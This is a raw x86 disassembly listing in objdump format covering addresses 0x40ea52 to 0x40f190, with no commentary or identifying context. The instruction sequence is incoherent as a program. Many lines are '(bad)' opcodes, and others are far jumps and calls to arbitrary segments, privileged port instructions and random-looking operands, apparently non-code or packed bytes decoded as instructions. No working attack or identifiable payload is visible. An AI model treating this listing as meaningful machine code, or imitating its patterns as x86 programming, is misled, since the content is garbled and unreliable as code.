  40ea52:	cmp    BYTE PTR [ecx-0x55c23146],bl
  40ea58:	rol    BYTE PTR [ebp+0x6f],0xf5
  40ea5c:	setns  ch
  40ea5f:	retf   0x13ca
  40ea62:	call   0x80a17362
  40ea67:	adc    eax,0xa9255651
  40ea6c:	test   al,0x75
  40ea6e:	sub    eax,0x8272630f
  40ea73:	rcr    BYTE PTR [esp+edx*2],0x16
  40ea77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea78:	mov    ah,0x57
  40ea7a:	cmp    eax,0x8b7e2821
  40ea7f:	mov    ds:0xbd4ece1d,eax
  40ea84:	fild   WORD PTR [edx]
  40ea86:	outs   dx,DWORD PTR ds:[esi]
  40ea87:	or     DWORD PTR [ecx-0x1f32735c],edx
  40ea8d:	jle    0x40ea6d
  40ea8f:	cmp    BYTE PTR [ebx-0x731e4f0],dh
  40ea95:	dec    esp
  40ea96:	sbb    BYTE PTR [eax],ah
  40ea98:	mov    WORD PTR [edi],es
  40ea9a:	and    ecx,esi
  40ea9c:	mov    dl,0xfc
  40ea9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea9f:	mov    bh,0x97
  40eaa1:	mov    bh,0x98
  40eaa3:	fcmove st,st(6)
  40eaa5:	xlat   BYTE PTR ds:[ebx]
  40eaa6:	fld    QWORD PTR [edi]
  40eaa8:	adc    DWORD PTR [ebx-0x51],0xffffffba
  40eaac:	push   esi
  40eaad:	(bad)  
  40eaae:	retf   0x7f5d
  40eab1:	in     al,0x99
  40eab3:	push   eax
  40eab4:	pop    es
  40eab5:	and    eax,0xec88dba
  40eaba:	add    DWORD PTR [ecx],edx
  40eabc:	aam    0x53
  40eabe:	or     ecx,DWORD PTR [edi-0x721b577f]
  40eac4:	fiadd  DWORD PTR [esi-0x1548f429]
  40eaca:	pushf  
  40eacb:	jle    0x40eab7
  40eacd:	and    al,0x88
  40eacf:	jp     0x40eb0b
  40ead1:	cmp    eax,0x45e4079f
  40ead6:	pop    esp
  40ead7:	ret    0x1190
  40eada:	xor    eax,edi
  40eadc:	xchg   ebp,eax
  40eadd:	inc    esp
  40eade:	and    ecx,ebx
  40eae0:	cmc    
  40eae1:	sbb    eax,0xc87f4918
  40eae6:	xor    dl,BYTE PTR [edi]
  40eae8:	and    edi,esp
  40eaea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaeb:	pop    ecx
  40eaec:	or     eax,0x9e88634a
  40eaf1:	retf   
  40eaf2:	xor    al,0xa1
  40eaf4:	jl     0x40eb50
  40eaf6:	in     al,dx
  40eaf7:	jmp    0x4ea8:0xb0d62e1
  40eafe:	idiv   WORD PTR [esi]
  40eb01:	jbe    0x40eac3
  40eb03:	lahf   
  40eb04:	rcl    BYTE PTR [edi*8-0x7fcee393],0xa1
  40eb0c:	jg     0x40eaa6
  40eb0e:	xor    bl,BYTE PTR [ebp-0x682554b2]
  40eb14:	loopne 0x40eb1b
  40eb16:	add    eax,0xb5810ca3
  40eb1b:	shl    BYTE PTR [eax+0x2c],cl
  40eb1e:	jmp    FWORD PTR [di+0x58]
  40eb22:	jbe    0x40eac8
  40eb24:	pop    edx
  40eb25:	jno    0x40eb43
  40eb27:	sub    eax,0x563546f7
  40eb2c:	(bad)  
  40eb2d:	mov    ds:0x804d70a0,al
  40eb32:	xchg   ebx,eax
  40eb33:	scas   al,BYTE PTR es:[edi]
  40eb34:	jp     0x40eb59
  40eb36:	sub    DWORD PTR [edx],0x5
  40eb39:	dec    edx
  40eb3a:	dec    ebp
  40eb3b:	push   esp
  40eb3c:	inc    esi
  40eb3d:	push   edx
  40eb3e:	and    cl,BYTE PTR [ecx-0x342b7c0]
  40eb44:	cmc    
  40eb45:	cmp    BYTE PTR [edi-0x279b5cff],dh
  40eb4b:	scas   al,BYTE PTR es:[edi]
  40eb4c:	pop    esi
  40eb4d:	inc    edx
  40eb4e:	mov    al,0x1e
  40eb50:	test   eax,0xd006e7b7
  40eb55:	pop    eax
  40eb56:	and    esp,esi
  40eb58:	stos   BYTE PTR es:[edi],al
  40eb59:	(bad)  
  40eb5a:	je     0x40eb0a
  40eb5c:	shl    dh,0x59
  40eb5f:	test   DWORD PTR [ebp-0x3829ba03],esi
  40eb65:	mov    dh,0x42
  40eb67:	push   edi
  40eb68:	pop    ebx
  40eb69:	cld    
  40eb6a:	aaa    
  40eb6b:	mov    ebp,0x4c0a9e2f
  40eb70:	or     eax,edx
  40eb72:	jmp    0xb3e4:0x1ea338b7
  40eb79:	mov    bl,0xa4
  40eb7b:	cmp    bh,BYTE PTR [ecx-0xe9e3491]
  40eb81:	aas    
  40eb82:	enter  0x8d59,0x51
  40eb86:	jge    0x40eb38
  40eb88:	call   0x4c87ec2f
  40eb8d:	inc    edx
  40eb8e:	int    0xe3
  40eb90:	dec    edi
  40eb91:	jnp    0x40eb24
  40eb93:	mov    esp,0xe8b2be39
  40eb98:	test   eax,0x39a79d54
  40eb9d:	pop    ecx
  40eb9e:	adc    ebx,DWORD PTR [edi]
  40eba0:	dec    ebx
  40eba1:	fidivr DWORD PTR [ebx-0x60cb3044]
  40eba7:	rol    BYTE PTR [eax+ebp*8+0x65],1
  40ebab:	mov    eax,0xb9d9a743
  40ebb0:	adc    DWORD PTR [esi+0x43],edx
  40ebb3:	fstp   QWORD PTR [edx]
  40ebb5:	pop    ebp
  40ebb6:	fadd   st,st(5)
  40ebb8:	cld    
  40ebb9:	xor    al,0x35
  40ebbb:	cwde   
  40ebbc:	add    edi,DWORD PTR [eax]
  40ebbe:	inc    esi
  40ebbf:	leave  
  40ebc0:	jb     0x40eb78
  40ebc2:	pop    eax
  40ebc3:	fist   DWORD PTR [ebp+0x385bca84]
  40ebc9:	into   
  40ebca:	push   cs
  40ebcb:	sub    dh,BYTE PTR ds:0x2bab97b1
  40ebd1:	mov    edx,0xed182408
  40ebd6:	scas   eax,DWORD PTR es:[edi]
  40ebd7:	fild   QWORD PTR [ebp-0x10]
  40ebda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebdb:	mov    ds:0x5e692bc,al
  40ebe0:	xor    al,0xc4
  40ebe2:	cli    
  40ebe3:	adc    DWORD PTR [ebx+0x24],ebp
  40ebe6:	pop    ds
  40ebe7:	pop    ecx
  40ebe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe9:	or     DWORD PTR [eax],0x4fd83d69
  40ebef:	jne    0x40eb9e
  40ebf1:	and    DWORD PTR [esi+0x45],edi
  40ebf4:	stos   BYTE PTR es:[edi],al
  40ebf5:	mov    al,0xff
  40ebf7:	call   0xf56e:0x400e085
  40ebfe:	jmp    0x8101:0xb5d92948
  40ec05:	dec    ecx
  40ec06:	cmp    DWORD PTR [eax+0x3f],edi
  40ec09:	fs retf 0xaae9
  40ec0d:	aam    0x5c
  40ec0f:	push   ebp
  40ec10:	in     eax,0xbf
  40ec12:	and    BYTE PTR [esi+0x4cf12826],cl
  40ec18:	jl     0x40ec4e
  40ec1a:	jmp    0xd251:0xf1afb92f
  40ec21:	loope  0x40ec1c
  40ec23:	iret   
  40ec24:	cmp    esp,DWORD PTR [edx]
  40ec26:	lods   al,BYTE PTR ds:[esi]
  40ec27:	fwait
  40ec28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec29:	xor    cl,ch
  40ec2b:	cdq    
  40ec2c:	lock pop ecx
  40ec2e:	and    DWORD PTR cs:[eax-0x2fcfb10b],esi
  40ec35:	push   ebx
  40ec36:	imul   ecx,DWORD PTR [eax-0x37b1cd88],0xb142607a
  40ec40:	dec    ebp
  40ec41:	push   cs
  40ec42:	call   0x32715a6e
  40ec47:	ror    ah,1
  40ec49:	pop    ebx
  40ec4a:	xchg   ebx,eax
  40ec4b:	add    bh,BYTE PTR [esi+edi*8+0x3a]
  40ec4f:	out    dx,eax
  40ec50:	mul    BYTE PTR [esi]
  40ec52:	and    dl,al
  40ec54:	xchg   ebp,eax
  40ec55:	mov    esp,0x5d5a940d
  40ec5a:	imul   esi,DWORD PTR [eax],0x90c4aa24
  40ec60:	inc    eax
  40ec61:	add    eax,0xbc3fc5ac
  40ec66:	sub    cl,BYTE PTR [edi+0x15]
  40ec69:	dec    eax
  40ec6a:	jp     0x40ebed
  40ec6c:	inc    eax
  40ec6d:	mov    edi,0xa8b5bf0
  40ec72:	lods   eax,DWORD PTR ds:[esi]
  40ec73:	loop   0x40ec3a
  40ec75:	sahf   
  40ec76:	xor    bh,BYTE PTR [esp+ebx*2]
  40ec79:	add    al,0x41
  40ec7b:	mul    DWORD PTR [edi-0x3f77b49d]
  40ec81:	lds    ebp,FWORD PTR [edi]
  40ec83:	dec    edx
  40ec84:	mov    dh,0x8e
  40ec86:	(bad)  
  40ec87:	ins    DWORD PTR es:[edi],dx
  40ec88:	js     0x40ec92
  40ec8a:	xor    eax,0x7f84a561
  40ec8f:	gs cmc 
  40ec91:	push   ecx
  40ec92:	pop    esp
  40ec93:	out    0x76,eax
  40ec95:	and    al,0x16
  40ec97:	and    BYTE PTR [esi],bl
  40ec99:	cmp    dh,ah
  40ec9b:	clc    
  40ec9c:	dec    eax
  40ec9d:	scas   al,BYTE PTR es:[edi]
  40ec9e:	faddp  st(0),st
  40eca0:	xor    ebp,edi
  40eca2:	add    DWORD PTR [esi],edx
  40eca4:	sbb    BYTE PTR ds:0x51b7f2b,ch
  40ecaa:	sub    eax,0x1121bac3
  40ecaf:	xchg   ebx,eax
  40ecb0:	popf   
  40ecb1:	aas    
  40ecb2:	or     al,0x7a
  40ecb4:	pop    eax
  40ecb5:	push   edi
  40ecb6:	sbb    eax,0x98bf6602
  40ecbb:	mov    ch,0x68
  40ecbd:	xchg   BYTE PTR [ecx-0x38],cl
  40ecc0:	out    0xc5,eax
  40ecc2:	and    ch,BYTE PTR [ebx+0x1d541aa3]
  40ecc8:	(bad)  
  40ecc9:	int    0x50
  40eccb:	fst    DWORD PTR [eax-0x240ead81]
  40ecd1:	adc    al,BYTE PTR [ecx]
  40ecd3:	mov    al,ds:0x44d9329a
  40ecd8:	hlt    
  40ecd9:	pop    eax
  40ecda:	mov    bh,0x33
  40ecdc:	dec    ebx
  40ecdd:	in     eax,0xd5
  40ecdf:	or     BYTE PTR [edx-0x60],0x57
  40ece3:	adc    al,0xc2
  40ece5:	and    DWORD PTR [ebx],0x468fbe84
  40eceb:	(bad)  
  40ecec:	leave  
  40eced:	or     ch,BYTE PTR [edi-0x553ea30]
  40ecf3:	(bad)  
  40ecf4:	jmp    0x40ed71
  40ecf6:	inc    ebp
  40ecf7:	out    0xf3,eax
  40ecf9:	mov    al,0x1b
  40ecfb:	(bad)  
  40ecfc:	mov    cl,0x52
  40ecfe:	(bad)  
  40ed00:	mov    ecx,0x67da20cb
  40ed05:	pop    esp
  40ed06:	mov    bh,BYTE PTR ds:0xd572df98
  40ed0c:	inc    ebx
  40ed0d:	(bad)  
  40ed0f:	xchg   BYTE PTR [edx],bl
  40ed11:	xlat   BYTE PTR ds:[ebx]
  40ed12:	jl     0x40ed83
  40ed14:	and    bh,BYTE PTR [edi+0x3f2f8fe6]
  40ed1a:	sbb    eax,0xd40c0a41
  40ed1f:	xor    al,0x58
  40ed21:	push   es
  40ed22:	push   esp
  40ed23:	les    edi,FWORD PTR [esi-0x5e411de4]
  40ed29:	push   0x838a001b
  40ed2e:	adc    eax,0xd60b3cf1
  40ed33:	inc    edi
  40ed34:	adc    al,0xad
  40ed36:	ret    
  40ed37:	sbb    DWORD PTR [edi-0x5ad95f9d],edi
  40ed3d:	add    bl,al
  40ed3f:	leave  
  40ed40:	ins    BYTE PTR es:[edi],dx
  40ed41:	sub    DWORD PTR ds:0x22233573,ebx
  40ed47:	push   esi
  40ed48:	adc    al,0x75
  40ed4a:	mov    eax,ds:0x152894f4
  40ed4f:	add    BYTE PTR [ebx-0x1d],bh
  40ed52:	mov    ds:0x4467773e,al
  40ed57:	adc    esp,ebp
  40ed59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed5a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed5c:	bound  edx,QWORD PTR [esi-0x46]
  40ed5f:	(bad)  [ebp+0x17]
  40ed62:	sbb    edx,DWORD PTR [ebx-0x2e]
  40ed65:	outs   dx,BYTE PTR ds:[esi]
  40ed66:	adc    bh,bh
  40ed68:	fisttp QWORD PTR [edx]
  40ed6a:	fucomp st(1)
  40ed6c:	push   ecx
  40ed6d:	and    al,0x3c
  40ed6f:	or     esi,DWORD PTR [esi+edi*2]
  40ed72:	or     al,cl
  40ed74:	or     al,BYTE PTR [edx+edi*2-0x36]
  40ed78:	clc    
  40ed79:	icebp  
  40ed7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed7b:	jbe    0x40ed9f
  40ed7d:	jmp    0xe92b:0xa16d9b2c
  40ed84:	adc    ecx,edx
  40ed86:	xchg   cl,bh
  40ed88:	sti    
  40ed89:	inc    edi
  40ed8a:	xor    BYTE PTR [ebp-0x2966552c],0xe9
  40ed91:	fisub  WORD PTR [edx]
  40ed93:	aaa    
  40ed94:	mov    ch,0xf4
  40ed96:	mov    eax,0xa7db2891
  40ed9b:	inc    esi
  40ed9c:	cmc    
  40ed9d:	inc    edx
  40ed9e:	gs push ebx
  40eda0:	inc    esi
  40eda1:	imul   edx,DWORD PTR [ebx],0xffffff87
  40eda4:	inc    edx
  40eda5:	(bad)  
  40eda6:	fld    TBYTE PTR [esi+0x22adde41]
  40edac:	aaa    
  40edad:	je     0x40ee29
  40edaf:	aas    
  40edb0:	mov    ds:0x9f97712f,eax
  40edb5:	jae    0x40ee0b
  40edb7:	sub    eax,0xdb0c8671
  40edbc:	ret    
  40edbd:	sbb    al,0xc6
  40edbf:	xor    al,0x88
  40edc1:	jmp    0x40ed6b
  40edc3:	push   ebp
  40edc4:	inc    eax
  40edc5:	ret    
  40edc6:	(bad)  
  40edc7:	push   edi
  40edc8:	xor    edx,esi
  40edca:	popf   
  40edcb:	adc    al,0xc3
  40edcd:	push   0x75
  40edcf:	ret    0xa842
  40edd2:	dec    esi
  40edd3:	int3   
  40edd4:	inc    ebp
  40edd5:	mov    WORD PTR [eax],gs
  40edd7:	inc    esp
  40edd8:	je     0x40edef
  40edda:	sbb    dl,BYTE PTR [ebx]
  40eddc:	lods   eax,DWORD PTR ds:[esi]
  40eddd:	cwde   
  40edde:	jle    0x40ed63
  40ede0:	ret    0xc634
  40ede3:	dec    eax
  40ede4:	sbb    BYTE PTR [ecx],cl
  40ede6:	mov    dl,0xd
  40ede8:	mov    bh,BYTE PTR [edi+0x37]
  40edeb:	jecxz  0x40ed77
  40eded:	mov    esp,0x769d0c6d
  40edf2:	mov    esi,0x5807654b
  40edf7:	mov    bh,dl
  40edf9:	out    0x5,eax
  40edfb:	out    dx,al
  40edfc:	call   0xcde:0x590e6c1b
  40ee03:	cwde   
  40ee04:	or     al,0x5a
  40ee06:	push   es
  40ee07:	mov    dh,ch
  40ee09:	sub    al,0x16
  40ee0b:	sbb    al,0xda
  40ee0d:	sar    DWORD PTR [edi+edi*2],1
  40ee10:	jp     0x40ee2e
  40ee12:	xor    eax,DWORD PTR [ebx+0x5088dbbe]
  40ee18:	mov    ?,WORD PTR [edx+0x41]
  40ee1b:	jle    0x40ee82
  40ee1d:	fmul   DWORD PTR [edx]
  40ee1f:	mov    eax,0xba2e20d8
  40ee24:	xchg   DWORD PTR [ecx],eax
  40ee26:	test   DWORD PTR [ebx+0x78],ebx
  40ee29:	cwde   
  40ee2a:	repnz lea edx,[ebx+0xb]
  40ee2e:	pop    ss
  40ee2f:	add    cl,BYTE PTR [ebx+0x10]
  40ee32:	fprem1 
  40ee34:	pusha  
  40ee35:	pop    edi
  40ee36:	mov    ds:0xd4de4fce,eax
  40ee3b:	mov    cl,0x2f
  40ee3d:	test   eax,0xddad1024
  40ee42:	jbe    0x40edec
  40ee44:	loop   0x40ee82
  40ee46:	fs dec ebp
  40ee48:	mov    BYTE PTR [ecx-0x48],cl
  40ee4b:	nop
  40ee4c:	add    DWORD PTR [eax-0x13],ecx
  40ee4f:	or     al,0x6
  40ee51:	dec    edi
  40ee52:	inc    ebx
  40ee53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee54:	outs   dx,BYTE PTR ds:[esi]
  40ee55:	sti    
  40ee56:	dec    ebp
  40ee57:	jbe    0x40ee3a
  40ee59:	mov    eax,edi
  40ee5b:	push   esi
  40ee5c:	(bad)  
  40ee5d:	jns    0x40ee75
  40ee5f:	pop    esi
  40ee60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee61:	dec    ebx
  40ee62:	outs   dx,BYTE PTR ds:[esi]
  40ee63:	xchg   esp,eax
  40ee64:	push   ebx
  40ee65:	retf   0xbf85
  40ee68:	outs   dx,BYTE PTR ds:[esi]
  40ee69:	call   FWORD PTR [esi+ebp*4-0x791e7a94]
  40ee70:	sti    
  40ee71:	mov    eax,ds:0xdcfedf4c
  40ee76:	dec    eax
  40ee77:	ret    0x72c9
  40ee7a:	xchg   edx,eax
  40ee7b:	out    dx,eax
  40ee7c:	aam    0xb0
  40ee7e:	lea    eax,[edi]
  40ee80:	das    
  40ee81:	lds    esi,FWORD PTR [eax]
  40ee83:	jg     0x40ee4c
  40ee85:	inc    ebx
  40ee86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee87:	jle    0x40ee8c
  40ee89:	push   cs
  40ee8a:	push   0xffffffd6
  40ee8c:	in     eax,dx
  40ee8d:	add    eax,0x4a00299
  40ee92:	adc    eax,0x443ad621
  40ee97:	lds    esp,FWORD PTR [edx-0x31]
  40ee9a:	scas   al,BYTE PTR es:[edi]
  40ee9b:	rcl    BYTE PTR [ebx],cl
  40ee9d:	sbb    al,0xee
  40ee9f:	mov    al,ds:0x5d79c489
  40eea4:	cld    
  40eea5:	lods   al,BYTE PTR ds:[esi]
  40eea6:	and    al,0x72
  40eea8:	pop    edi
  40eea9:	mov    dl,0xf6
  40eeab:	or     BYTE PTR [edi+0x1fa96083],ah
  40eeb1:	gs js  0x40eead
  40eeb4:	outs   dx,WORD PTR ds:[esi]
  40eeb6:	xor    al,0xc0
  40eeb8:	sub    edx,esp
  40eeba:	jle    0x40ef1a
  40eebc:	stos   DWORD PTR es:[edi],eax
  40eebd:	fbld   TBYTE PTR [ecx+ebx*4+0x7c2066d0]
  40eec4:	retf   
  40eec5:	xchg   BYTE PTR [esi+0x38e26301],ch
  40eecb:	scas   al,BYTE PTR es:[edi]
  40eecc:	cmp    esp,esp
  40eece:	jbe    0x40ee5e
  40eed0:	xlat   BYTE PTR ds:[ebx]
  40eed1:	test   dl,cl
  40eed3:	test   BYTE PTR [esi],bh
  40eed5:	jl     0x40eea5
  40eed7:	in     eax,0xa8
  40eed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeda:	sub    al,0xda
  40eedc:	es push ecx
  40eede:	jg     0x40ef5b
  40eee0:	loopne 0x40ef48
  40eee2:	push   edx
  40eee3:	xchg   ecx,eax
  40eee4:	inc    ecx
  40eee5:	dec    edi
  40eee6:	mov    ebp,0x4b663dbc
  40eeeb:	lock push esi
  40eeed:	dec    eax
  40eeee:	jns    0x40ef22
  40eef0:	js     0x40ef58
  40eef2:	inc    edi
  40eef3:	sbb    eax,0xfb927ad1
  40eef8:	jl     0x40ee99
  40eefa:	push   0x40
  40eefc:	xchg   ebx,eax
  40eefd:	sbb    edx,DWORD PTR [ebp+0x76bf0d1f]
  40ef03:	aam    0x92
  40ef05:	sbb    DWORD PTR [ebx],ecx
  40ef07:	(bad)  
  40ef08:	cmp    bl,BYTE PTR [eax-0x66b83003]
  40ef0e:	push   ds
  40ef0f:	or     eax,0xa7a6a540
  40ef14:	mov    esp,0xffef7c89
  40ef19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1a:	inc    esi
  40ef1b:	push   ecx
  40ef1c:	mov    ds:0xe9c3ba08,al
  40ef21:	and    DWORD PTR [esp+ebp*8],eax
  40ef24:	imul   esp,DWORD PTR [ebx+ecx*1],0xffffffda
  40ef28:	int3   
  40ef29:	sahf   
  40ef2a:	mov    ebx,0x2c50f4cf
  40ef2f:	mov    bl,0x3e
  40ef31:	mov    al,0xfd
  40ef33:	adc    DWORD PTR [edx-0x223a4e68],0x623f360b
  40ef3d:	imul   eax,DWORD PTR [ecx+edx*8+0x5d],0xffffffa2
  40ef42:	out    0xe4,al
  40ef44:	xor    al,0x84
  40ef46:	std    
  40ef47:	cdq    
  40ef48:	mov    ds:0xb94ce31a,eax
  40ef4d:	jge    0x40efa5
  40ef4f:	int    0x37
  40ef51:	cmp    DWORD PTR [edi],ebp
  40ef53:	pop    es
  40ef54:	pushf  
  40ef55:	retf   
  40ef56:	sub    eax,0x1ff5f2f8
  40ef5b:	ss mov ebx,0x9b800ca0
  40ef61:	ret    
  40ef62:	jmp    0x4871:0x8211d2da
  40ef69:	enter  0x812a,0x8b
  40ef6d:	inc    ebx
  40ef6e:	jl     0x40ef76
  40ef70:	cmp    edx,DWORD PTR [ecx-0x548cf5dd]
  40ef76:	cwde   
  40ef77:	or     al,BYTE PTR [edx]
  40ef79:	or     ecx,DWORD PTR [esi+0x3f6382f6]
  40ef7f:	cmp    al,0x7a
  40ef81:	sub    eax,0xce951975
  40ef86:	adc    ch,bl
  40ef88:	mov    edi,0xa53721
  40ef8d:	fdiv   st,st(0)
  40ef8f:	mov    cl,0x7d
  40ef91:	shr    dh,cl
  40ef93:	adc    eax,0xe4207cfc
  40ef98:	call   0xe5e:0xd14dc81
  40ef9f:	(bad)  [ecx+ecx*1]
  40efa2:	jecxz  0x40efad
  40efa4:	mov    esi,0x486a9732
  40efa9:	in     eax,dx
  40efaa:	stos   BYTE PTR es:[edi],al
  40efab:	inc    ebx
  40efac:	adc    cl,bl
  40efae:	and    dl,cl
  40efb0:	mov    eax,ds:0xa4b1aa87
  40efb5:	out    0xb6,al
  40efb7:	inc    eax
  40efb8:	pop    ebx
  40efb9:	push   ebx
  40efba:	cmp    BYTE PTR [esi],0xda
  40efbd:	lahf   
  40efbe:	mov    BYTE PTR [ebx],bh
  40efc0:	clc    
  40efc1:	sbb    BYTE PTR [ecx],bl
  40efc3:	les    ebx,FWORD PTR [ebx+0x3e]
  40efc6:	mov    bh,0xe3
  40efc8:	(bad)  
  40efc9:	fcom   DWORD PTR [edx+edx*8]
  40efcc:	fistp  QWORD PTR [edx+0x1]
  40efcf:	pop    ebp
  40efd0:	retf   0x3e22
  40efd3:	mov    dl,0x4
  40efd5:	les    esp,FWORD PTR [eax+0x1c]
  40efd8:	nop    DWORD PTR [edx-0x45]
  40efdc:	mov    al,ds:0x4071d6dc
  40efe1:	xchg   edx,eax
  40efe2:	jmp    0x40f04e
  40efe4:	daa    
  40efe5:	xor    DWORD PTR [eax-0x51a9e74],edx
  40efeb:	jge    0x40efa2
  40efed:	push   ds
  40efee:	into   
  40efef:	into   
  40eff0:	(bad)  
  40eff1:	xchg   edi,eax
  40eff2:	out    0xfa,eax
  40eff4:	repnz and eax,0x586464d5
  40effa:	xchg   ebp,eax
  40effb:	(bad)  
  40effc:	or     eax,0xd6ae373d
  40f001:	imul   edx,DWORD PTR [edx],0xffffffae
  40f004:	push   ds
  40f005:	cld    
  40f006:	mov    dl,0xc5
  40f008:	popa   
  40f009:	mov    bl,0x16
  40f00b:	ret    
  40f00c:	ss in  al,dx
  40f00e:	dec    ebp
  40f00f:	pop    ecx
  40f010:	aad    0xde
  40f012:	sahf   
  40f013:	pop    edi
  40f014:	test   eax,0xfb23c6c
  40f019:	mov    bh,0xf6
  40f01b:	imul   ebp,DWORD PTR [ebp-0x32],0x12
  40f01f:	retf   0xbf84
  40f022:	sbb    BYTE PTR [ebx+0x3b],cl
  40f025:	jbe    0x40f00e
  40f027:	cli    
  40f028:	push   ds
  40f029:	sbb    al,0xe5
  40f02b:	sub    DWORD PTR ds:0x623ccb4e,edi
  40f031:	sbb    ecx,DWORD PTR [ebx-0x13]
  40f034:	cmp    DWORD PTR [edi-0x50],0x78f832da
  40f03b:	xor    eax,0xa343d811
  40f040:	sar    BYTE PTR [ebx-0x5b],0xa1
  40f044:	inc    ecx
  40f045:	jmp    0x40f0a3
  40f047:	in     al,dx
  40f048:	pop    esi
  40f049:	stos   DWORD PTR es:[edi],eax
  40f04a:	pop    esp
  40f04b:	pop    edx
  40f04c:	inc    esp
  40f04d:	dec    ebx
  40f04e:	ret    0x5ad3
  40f051:	lods   eax,DWORD PTR ds:[esi]
  40f052:	fs popf 
  40f054:	cmp    eax,0x1b6172ca
  40f059:	xor    al,0x35
  40f05b:	lods   eax,DWORD PTR ds:[esi]
  40f05c:	xchg   ebx,eax
  40f05d:	pop    edx
  40f05e:	es in  al,0x29
  40f061:	xchg   al,dl
  40f063:	stos   BYTE PTR es:[edi],al
  40f064:	mov    cl,0x3f
  40f066:	sub    al,0x21
  40f068:	mov    ds:0xf0887248,eax
  40f06d:	xlat   BYTE PTR ds:[ebx]
  40f06e:	cmp    al,BYTE PTR [bx-0x3a25]
  40f073:	es push ebp
  40f075:	push   eax
  40f076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f077:	push   ecx
  40f078:	jne    0x40f048
  40f07a:	mov    ebp,0x8203810b
  40f07f:	sub    eax,0xd53dc848
  40f084:	dec    esp
  40f085:	mov    cl,0x91
  40f087:	(bad)  
  40f088:	std    
  40f089:	xchg   esp,esi
  40f08b:	jmp    0x1a4c:0xd0f2b7c7
  40f092:	cld    
  40f093:	retf   0xcf5d
  40f096:	inc    edx
  40f097:	add    cl,dl
  40f099:	pop    ds
  40f09a:	aaa    
  40f09b:	jg     0x40f0ce
  40f09d:	push   0x2a23c7f8
  40f0a2:	retf   0xbc44
  40f0a5:	test   BYTE PTR [edx+0x29b57e37],ah
  40f0ab:	mov    eax,0xa850dfa
  40f0b0:	ret    
  40f0b1:	lods   eax,DWORD PTR ds:[esi]
  40f0b2:	or     eax,ebp
  40f0b4:	sar    BYTE PTR [esi],cl
  40f0b6:	inc    esp
  40f0b7:	in     eax,dx
  40f0b8:	fnclex 
  40f0ba:	leave  
  40f0bb:	xabort 0x2a
  40f0be:	dec    esi
  40f0bf:	add    bl,0x58
  40f0c2:	outs   dx,DWORD PTR ds:[esi]
  40f0c3:	add    DWORD PTR [eax-0x5da262ca],ebx
  40f0c9:	dec    ecx
  40f0ca:	inc    esp
  40f0cb:	shl    DWORD PTR ds:0xd602b163,0x59
  40f0d2:	ins    BYTE PTR es:[edi],dx
  40f0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0d4:	sub    DWORD PTR [eax+ecx*4],esi
  40f0d7:	ror    DWORD PTR [ebx+0x4f85b73e],cl
  40f0dd:	or     edi,DWORD PTR [edx]
  40f0df:	pop    edx
  40f0e0:	inc    eax
  40f0e1:	out    0x82,eax
  40f0e3:	ins    BYTE PTR es:[edi],dx
  40f0e4:	xchg   edi,eax
  40f0e5:	sbb    al,ch
  40f0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0e8:	aaa    
  40f0e9:	and    al,0x96
  40f0eb:	mov    edi,0x4305fa5
  40f0f0:	mov    eax,0x642bf7a5
  40f0f6:	fs out dx,eax
  40f0f8:	clc    
  40f0f9:	jmp    0x67d545c3
  40f0fe:	xor    DWORD PTR [edx],0xffffff86
  40f101:	dec    edi
  40f102:	mov    cl,0xa5
  40f104:	icebp  
  40f105:	inc    ebp
  40f106:	fwait
  40f107:	in     eax,0x19
  40f109:	inc    esi
  40f10a:	xlat   BYTE PTR ds:[ebx]
  40f10b:	cmp    al,0x9d
  40f10d:	dec    edx
  40f10e:	loopne 0x40f17a
  40f110:	aas    
  40f111:	pusha  
  40f112:	cmp    al,0xdc
  40f114:	cmc    
  40f115:	mov    dl,0x1b
  40f117:	adc    al,0x8f
  40f119:	jns    0x40f15a
  40f11b:	add    DWORD PTR ds:0x3ce1ac01,ebp
  40f121:	shl    edx,0x72
  40f124:	pusha  
  40f125:	call   0x7898:0x39fa602a
  40f12c:	test   eax,0x945a17ad
  40f131:	popf   
  40f132:	rol    DWORD PTR gs:0x4564b476,cl
  40f139:	cdq    
  40f13a:	cmc    
  40f13b:	sahf   
  40f13c:	push   eax
  40f13d:	sub    al,0xea
  40f13f:	loop   0x40f1a1
  40f141:	popa   
  40f142:	out    dx,eax
  40f143:	test   al,0xc9
  40f145:	sbb    al,0x94
  40f147:	ret    
  40f148:	outs   dx,BYTE PTR ds:[esi]
  40f149:	push   ecx
  40f14a:	push   0xa4f682c5
  40f14f:	cli    
  40f150:	test   eax,0x72faebe7
  40f155:	fs mov gs,esi
  40f158:	fstp   DWORD PTR [esi+0x32]
  40f15b:	adc    DWORD PTR [eax],ecx
  40f15d:	inc    esp
  40f15e:	popa   
  40f15f:	push   edx
  40f160:	sub    eax,0x4f1e120e
  40f165:	les    esp,FWORD PTR [esi-0x6f]
  40f168:	int3   
  40f169:	mov    ebx,eax
  40f16b:	xchg   bl,al
  40f16d:	repnz dec esi
  40f16f:	dec    esp
  40f170:	aas    
  40f171:	jne    0x40f0fd
  40f173:	cmp    dl,bh
  40f175:	popa   
  40f176:	mov    ecx,0x51fe326
  40f17b:	gs repz ja 0x40f14a
  40f17f:	push   ds
  40f180:	xchg   edx,eax
  40f181:	cmp    BYTE PTR [eax-0x45],dl
  40f184:	shl    DWORD PTR es:[ebx-0x6c],cl
  40f188:	mov    dh,0xa8
  40f18a:	push   edx
  40f18b:	hlt    
  40f18c:	dec    esi
  40f18d:	pop    ss
  40f18e:	(bad)  
  40f190:	add    bh,dh
